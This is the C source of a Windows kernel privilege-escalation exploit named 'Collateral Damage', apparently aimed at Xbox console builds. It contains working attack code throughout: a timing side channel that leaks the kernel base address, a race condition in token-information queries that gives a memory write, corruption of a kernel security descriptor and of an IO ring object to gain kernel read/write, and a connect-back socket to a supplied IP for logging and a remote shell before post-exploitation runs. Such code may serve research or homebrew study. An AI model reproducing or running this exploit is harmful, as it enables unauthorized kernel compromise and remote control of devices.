//
// Collateral Damage - Emma Kirkpatrick @carrot_c4k3 & Lander Brandt @landaire (exploits.forsale)
//
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <sddl.h>
#include <winsock2.h>

#include "ioring.h"
#include "nt_offsets.h"

// socket stuff
WSADATA wsaData;
SOCKET winSock;
struct sockaddr_in sockAddr;
int port = 7070;


// struct representing the info passed in from gamescript at a static address
typedef struct _COLLAT_INFO {
    CHAR ip_addr[0x20];
} COLLAT_INFO;

#define GLOBAL_INFO ((COLLAT_INFO*)0x44000000)

ULONG64 ullSystemEPROCaddr = 0;
UINT64 g_kernel_base = 0;


// misc windows definitions
#define STATUS_SUCCESS ((NTSTATUS)0)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define SystemBuildVersionInformation 222

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _Out_writes_bytes_to_opt_(TokenInformationLength, *ReturnLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength,
    _Out_ PULONG ReturnLength
);

// All the code for triggering the bug lives here
volatile ULONG64* smash_ptr = NULL;
ULONG64 smash_var = 0;

// this function will run in a second thread to attempt to trigger the bug
DWORD smash_func(LPVOID unused)
{
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    ULONG64 val = smash_var;
    while (1) {
        *smash_ptr = val;
    }

    return 0;
}

WCHAR* magic_str = L"TSA://ProcUnique";
HANDLE token_handle = INVALID_HANDLE_VALUE;
BYTE output_buf[0x8000];
DWORD bytes_returned = 0;
WCHAR* test_ptr = 0;

VOID do_write(UINT64 addr)
{
    smash_var = addr;

    HANDLE hthread = CreateThread(NULL, 0, smash_func, NULL, 0, NULL);

    for (UINT i = 0; i < 0x80000; i++) //while (1)
    {
        *test_ptr = 0;
        NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);
        if (*test_ptr == 0)
        {
            break;
        }
    }
    TerminateThread(hthread, 0);
}

// build a security descriptor which is accessible to our process
void setup_sd()
{
    PBYTE sd_page = VirtualAlloc(0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    PBYTE psid_system = sd_page;
    psid_system[0] = 0x01;
    psid_system[1] = 0x01;
    psid_system[2] = 0x00;
    psid_system[3] = 0x00;
    psid_system[4] = 0x00;
    psid_system[5] = 0x00;
    psid_system[6] = 0x00;
    psid_system[7] = 0x05;
    psid_system[8] = 0x12;
    psid_system[9] = 0x00;
    psid_system[10] = 0x00;
    psid_system[11] = 0x00;
    psid_system[12] = 0x00;
    psid_system[13] = 0x00;
    psid_system[14] = 0x00;
    psid_system[15] = 0x00;

    PBYTE sacl_ptr = sd_page + 0x100;
    sacl_ptr[0] = 0x02;
    sacl_ptr[1] = 0x00;
    sacl_ptr[2] = 0x20;
    sacl_ptr[3] = 0x00;
    sacl_ptr[4] = 0x01;
    sacl_ptr[5] = 0x00;
    sacl_ptr[6] = 0x00;
    sacl_ptr[7] = 0x00;
    sacl_ptr[8] = 0x11;
    sacl_ptr[9] = 0x00;
    sacl_ptr[10] = 0x14;
    sacl_ptr[11] = 0x00;
    sacl_ptr[12] = 0x02;
    sacl_ptr[13] = 0x00;
    sacl_ptr[14] = 0x00;
    sacl_ptr[15] = 0x00;
    sacl_ptr[16] = 0x01;
    sacl_ptr[17] = 0x01;
    sacl_ptr[18] = 0x00;
    sacl_ptr[19] = 0x00;
    sacl_ptr[20] = 0x00;
    sacl_ptr[21] = 0x00;
    sacl_ptr[22] = 0x00;
    sacl_ptr[23] = 0x10;
    sacl_ptr[24] = 0x00;
    sacl_ptr[25] = 0x10;
    sacl_ptr[26] = 0x00;
    sacl_ptr[27] = 0x00;
    sacl_ptr[28] = 0x00;
    sacl_ptr[29] = 0x00;

    PBYTE dacl_ptr = sd_page + 0x200;
    dacl_ptr[0] = 0x02;
    dacl_ptr[1] = 0x00;
    dacl_ptr[2] = 0x00;
    dacl_ptr[3] = 0x01;
    dacl_ptr[4] = 0x02;
    dacl_ptr[5] = 0x00;
    dacl_ptr[6] = 0x00;
    dacl_ptr[7] = 0x00;
    dacl_ptr[8] = 0x00;
    dacl_ptr[9] = 0x00;
    dacl_ptr[10] = 0x18;
    dacl_ptr[11] = 0x00;
    dacl_ptr[12] = 0xFF;
    dacl_ptr[13] = 0xFF;
    dacl_ptr[14] = 0xFF;
    dacl_ptr[15] = 0xFF;
    dacl_ptr[16] = 0x01;
    dacl_ptr[17] = 0x02;
    dacl_ptr[18] = 0x00;
    dacl_ptr[19] = 0x00;
    dacl_ptr[20] = 0x00;
    dacl_ptr[21] = 0x00;
    dacl_ptr[22] = 0x00;
    dacl_ptr[23] = 0x0F;
    dacl_ptr[24] = 0x02;
    dacl_ptr[25] = 0x00;
    dacl_ptr[26] = 0x00;
    dacl_ptr[27] = 0x00;
    dacl_ptr[28] = 0x01;
    dacl_ptr[29] = 0x00;
    dacl_ptr[30] = 0x00;
    dacl_ptr[31] = 0x00;
    dacl_ptr[32] = 0x00;
    dacl_ptr[33] = 0x00;
    dacl_ptr[34] = 0x14;
    dacl_ptr[35] = 0x00;
    dacl_ptr[36] = 0xFF;
    dacl_ptr[37] = 0xFF;
    dacl_ptr[38] = 0xFF;
    dacl_ptr[39] = 0xFF;
    dacl_ptr[40] = 0x01;
    dacl_ptr[41] = 0x01;
    dacl_ptr[42] = 0x00;
    dacl_ptr[43] = 0x00;
    dacl_ptr[44] = 0x00;
    dacl_ptr[45] = 0x00;
    dacl_ptr[46] = 0x00;
    dacl_ptr[47] = 0x01;
    dacl_ptr[48] = 0x00;
    dacl_ptr[49] = 0x00;
    dacl_ptr[50] = 0x00;
    dacl_ptr[51] = 0x00;

    PISECURITY_DESCRIPTOR sd = 0x65007500;
    sd->Revision = 1;
    sd->Sbz1 = 0;
    sd->Control = 0x14;
    sd->Owner = psid_system;
    sd->Group = psid_system;
    sd->Sacl = sacl_ptr;
    sd->Dacl = dacl_ptr;
    return 0;
}

int do_exploit()
{
    ULONG sd_ptr_offset = get_sd_ptr_offset();

    // map the fake security descriptor that we will be swapping the real one with
    setup_sd();

    // grab the kernel base first!
    ULONG ret_len = 0;
    UINT64 nt_base = g_kernel_base;

    // get our token handle so we can prepare to trigger the bug
    OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &token_handle);
    NtQueryInformationToken(token_handle, TokenAccessInformation, output_buf, sizeof(output_buf), &bytes_returned);

    // search for the string attribute string ("TSA://ProcUnique")
    UINT64 magic_ptr = 0;
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], magic_str, 0x20) == 0) {
            magic_ptr = &output_buf[i];
            break;
        }
    }
    test_ptr = magic_ptr;

    // search for the pointer to the string to get the actual smash target
    for (UINT i = 0; i < sizeof(output_buf) - 0x20; i++)
    {
        if (memcmp(&output_buf[i], &magic_ptr, 8) == 0) {
            smash_ptr = &output_buf[i];
            break;
        }
    }

    getobjptr(&ullSystemEPROCaddr, 4, 4);

    // corrupt the security descriptor
    do_write(nt_base + sd_ptr_offset - 0x18);
    do_write(nt_base + sd_ptr_offset - 0x18 - 1);
    do_write(nt_base + sd_ptr_offset - 0x18 - 2);
    do_write(nt_base + sd_ptr_offset - 0x18 - 3);

    ullSystemEPROCaddr = 0;
    getobjptr(&ullSystemEPROCaddr, 4, 4);

    return 0;
}

#define STEP 0x100000
#define ITERATIONS 0x80
#define DUMMY_ITERATIONS 5
#define KERNEL_LOWER_BOUND 0xFFFFF80000A00000ull
#define KERNEL_UPPER_BOUND 0xfffff81000000000ull
#define ADDR_COUNT ((KERNEL_UPPER_BOUND - KERNEL_LOWER_BOUND) / STEP)

typedef struct _MEM_RANGE {
    UINT64 addr;
    UINT64 count;
} MEM_RANGE;

void bad_syscall();
UINT64 sidechannel(PVOID ptr);

MEM_RANGE* g_ranges_ptr;
UINT32 g_ranges_count;

VOID dump_timings(const char* output_file, PUINT32 timings)
{
    HANDLE h_file = CreateFileA(output_file, GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);

    DWORD bytes_written = 0;

    // write out the consts
    UINT32 f_step = STEP;
    UINT32 f_iterations = ITERATIONS;
    UINT32 f_dummy_iterations = DUMMY_ITERATIONS;
    UINT32 f_addr_count = ADDR_COUNT;
    UINT64 f_start_addr = KERNEL_LOWER_BOUND;
    // Uncomment to re-enable dumping timings to disc
    WriteFile(h_file, &f_step, sizeof(f_step), &bytes_written, 0);
    WriteFile(h_file, &f_iterations, sizeof(f_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_dummy_iterations, sizeof(f_dummy_iterations), &bytes_written, 0);
    WriteFile(h_file, &f_addr_count, sizeof(f_addr_count), &bytes_written, 0);
    WriteFile(h_file, &f_start_addr, sizeof(f_start_addr), &bytes_written, 0);
    WriteFile(h_file, timings, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32), &bytes_written, 0);
    

    FlushFileBuffers(h_file);
    CloseHandle(h_file);
}

UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
{
    CHAR dump_path[0x200] = { 0 };
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\..\\LocalState\\timings.bin", dump_path, sizeof(dump_path));

    HANDLE h_heap = GetProcessHeap();
    PUINT32 timings = HeapAlloc(h_heap, 0, (ADDR_COUNT * ITERATIONS) * sizeof(UINT32));
    PUINT32 avgs = HeapAlloc(h_heap, 0, ADDR_COUNT * sizeof(UINT32));
    MEM_RANGE* ranges = HeapAlloc(h_heap, 0, sizeof(MEM_RANGE) * 0x400);
    UINT32 ranges_count = 0;
    UINT64 avg_total = 0;
    UINT64 threshold = 0;
    for (UINT64 i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        UINT64 x = 0;
        UINT64 addr = KERNEL_LOWER_BOUND;
        while (x < ADDR_COUNT)
        {
            UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
            UINT64 res = sidechannel(addr);
            if (i >= DUMMY_ITERATIONS) {
                timings[(x * ITERATIONS) + (i - DUMMY_ITERATIONS)] = res;
            }
            x++;
        }
    }

    //dump_timings(dump_path, timings);

    // take avgs
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 avg = 0;
        for (UINT64 i = 0; i < ITERATIONS; i++)
        {
            avg += timings[(x * ITERATIONS) + i];
        }
        avg /= ITERATIONS;
        avgs[x] = avg;
    }

    // account for anomalies on boundaries
    for (UINT64 x = 0; x < ADDR_COUNT; x++)
    {
        UINT64 addr = KERNEL_LOWER_BOUND + (x * STEP);
        if (addr % 0x2000000 == 0)
        {
            if (x + 1 < ADDR_COUNT) {
                avgs[x] = avgs[x + 1];
            }
            else {
                avgs[x] = avgs[x - 1];
            }
        }
        avg_total += avgs[x];
    }

    avg_total /= ADDR_COUNT;
    threshold = avg_total + (avg_total / 3);

    UINT64 cur_range = 0;
    UINT64 cur_range_len = 0;
    for (UINT64 i = 0; i < ADDR_COUNT; i++)
    {
        UINT32 cur_timing = avgs[i];
        if (cur_timing > threshold) {
            if (cur_range) {
                cur_range_len++;
            }
            else {
                cur_range = i;
                cur_range_len = 1;
            }
        }
        else {
            if (cur_range) {
                if (cur_range_len > 4) {
                    ranges[ranges_count].addr = KERNEL_LOWER_BOUND + ((i - cur_range_len) * STEP);
                    ranges[ranges_count].count = cur_range_len;
                    ranges_count++;
                }

                cur_range_len = 0;
            }
        }
    }

    HeapFree(h_heap, 0, timings);
    HeapFree(h_heap, 0, avgs);
    g_ranges_ptr = ranges;
    g_ranges_count = ranges_count;

    UINT64 kernel_base = 0;

    for (int i = 0; i < ranges_count; i++) {
        UINT64 cur_addr = ranges[i].addr;
        UINT64 cur_count = ranges[i].count;

        if (cur_count > 80 && cur_count < 120) {
            kernel_base = cur_addr - 0x600000;
            break;
        }
    }

    return kernel_base;
}

int main(int argc, char** argv)
{
    DWORD bytes_written = 0;
    UINT64 ioring_addr = 0;
    ULONG build_rev = 0;
	CHAR path[0x400] = { 0 };
    CHAR ptr_msg[0x400] = { 0 };
    CHAR* cur_msg = NULL;
	CHAR* file_part = NULL;

    // Connect to the host for logging & remote shell
    int start = WSAStartup(MAKEWORD(2, 2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(GLOBAL_INFO->ip_addr);
    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

    // Write our banner message
    cur_msg = "Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Get and print the build number
    ULONG ret_len = 0;
    SYSTEM_BUILD_VERSION_INFORMATION build_version = { 0 };
    ULONG layer = 0;
    NtQuerySystemInformationEx(SystemBuildVersionInformation, &layer, sizeof(layer), &build_version, sizeof(build_version), &ret_len);
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Build number: %i.%i\n", build_version.NtBuildNumber, build_version.NtBuildQfe);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);

    // Check that the build is supported
    if (build_version.NtBuildNumber == 25398)
    {
        if (build_version.NtBuildQfe == 4478)
        {
            build_rev = 4478;
        }
        else if (build_version.NtBuildQfe == 4908 || build_version.NtBuildQfe == 4909)
        {
            // offsets are the same for 4908 and 4909
            build_rev = 4908;
        }
    }

    if (build_rev == 0)
    {
        cur_msg = "Unsupported build! Aborting.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
    }

    set_build_rev(build_rev);

    // Attempt to leak the kernel address
    cur_msg = "Attempting to find kernel base...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    FlushFileBuffers(winSock);
    UINT64 nt_base = do_sidechannel();
    g_kernel_base = nt_base;

    // If it fails bail and tell the user to reboot
    if (nt_base == 0)
    {
        cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    // Log the kernel base we leaked
    sprintf_s(ptr_msg, sizeof(ptr_msg), "Found likely kernel base: %p\n", nt_base);
    send(winSock, ptr_msg, strlen(ptr_msg), 0);
    
    // Do the first part of the exploit: corrupting SeMediumDaclSd
    cur_msg = "Attempting exploit...\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);
    do_exploit();

    // If we succeeded the system EPROC should be non-null
    if (ullSystemEPROCaddr == 0)
    {
        cur_msg = "Exploit failed! Reboot your console and try again.\n";
        send(winSock, cur_msg, strlen(cur_msg), 0);
        exit(0);
        return 0;
    }

    // Setup the IO ring
    ioring_addr = 0;
    int res = ioring_setup(&ioring_addr);
    if (res != 0)
    {
        sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
        send(winSock, ptr_msg, strlen(ptr_msg), 0);
    }

    // Corrupt the IO ring object
    do_write(ioring_addr + 0x9D);

    // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base);
    cur_msg = "Exploit succeeded! Running payload!\n\n";
    send(winSock, cur_msg, strlen(cur_msg), 0);

    // Run our post-exploitation code
    post_exploit(winSock);
    

	return 0;
}